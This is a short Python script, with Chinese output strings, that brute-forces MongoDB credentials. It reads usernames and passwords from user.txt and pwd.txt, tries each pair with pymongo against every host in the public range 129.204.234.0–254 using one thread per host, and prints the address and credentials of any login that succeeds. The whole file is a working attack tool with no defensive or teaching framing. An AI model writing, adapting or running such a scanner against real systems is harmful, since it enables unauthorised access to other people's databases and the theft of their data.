import pymongo
import threading

def mongo(ip):
    try:
        with open('user.txt') as userFile:
            for username in userFile.readlines():
                try:
                    with open('pwd.txt') as pwdFile:
                        for pwd in pwdFile.readlines():
                            username = username.replace('\n', '').replace('\r', '')
                            pwd = pwd.replace('\n', '').replace('\r', '')
                            try:
                                mongo = pymongo.MongoClient('mongodb://{}:{}@{}/'.format(username,pwd,ip))
                                dblist = mongo.list_database_names()
                                print('连接成功',ip,username,pwd)
                            except Exception as e:
                                if(str(e).find('10061')>-1 or str(e).find('out') > -1):
                                    print(e)
                                    return
                except:
                    pass
    except:
        pass

def main():
	for ip3 in range(234,235):
		for ip4 in range(0,255):
			threading.Thread(target=mongo,args=('129.204.'+str(ip3)+'.' + str(ip4),)).start()

if __name__ == '__main__':
    main()
